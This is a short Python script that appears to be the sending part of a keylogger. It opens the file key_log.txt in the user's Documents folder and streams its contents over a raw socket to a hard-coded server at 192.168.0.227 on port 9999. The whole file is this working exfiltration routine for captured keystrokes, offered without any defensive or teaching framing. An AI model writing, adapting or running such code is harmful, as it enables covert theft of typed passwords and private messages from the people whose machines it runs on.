import os
import socket
import sys

home_dir = os.path.expanduser("~")
log_file = os.path.join(home_dir, "Documents", "python project", "key_log.txt")
files = [log_file]

def send_logs():

    s = socket.socket()
    s.connect(("192.168.0.227", 9999))
    print("Connected to server")
        
    for filename in files:
        with open(filename, "rb") as f:
                # Read and send entire file in chunks
            while True:
                data = f.read(1024)
                if not data:
                    break
                s.send(data)
        
    print("Logs sent successfully")
    s.close()
